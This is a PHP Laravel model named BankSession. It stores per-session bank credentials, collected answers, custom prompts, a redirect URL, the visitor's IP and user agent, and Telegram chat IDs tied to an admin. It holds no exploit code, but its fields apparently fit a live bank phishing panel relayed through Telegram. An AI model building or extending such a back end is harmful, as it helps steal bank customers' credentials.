<?php

namespace App\Models;

use App\Enums\BankSessionStatus;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Str;

class BankSession extends Model
{
    protected $keyType = 'string';
    public $incrementing = false;

    protected $fillable = [
        'id',
        'bank_slug',
        'status',
        'action_type',
        'credentials',
        'answers',
        'custom_text',
        'custom_image_url',
        'redirect_url',
        'ip_address',
        'user_agent',
        'telegram_message_id',
        'telegram_chat_id',
        'admin_id',
        'last_activity_at',
    ];

    protected $casts = [
        'status' => BankSessionStatus::class,
        'action_type' => 'array',
        'credentials' => 'encrypted:array',
        'answers' => 'array',
        'last_activity_at' => 'datetime',
    ];

    protected static function boot(): void
    {
        parent::boot();
        static::creating(function (self $s) {
            if (empty($s->id)) {
                $s->id = (string) Str::uuid();
            }
            if ($s->action_type === null) {
                $s->action_type = ['type' => 'idle'];
            }
            if ($s->answers === null) {
                $s->answers = [];
            }
        });
    }

    public function pushAnswer(array $answer): void
    {
        $this->answers = [...$this->answers, $answer];
        $this->save();
    }
}
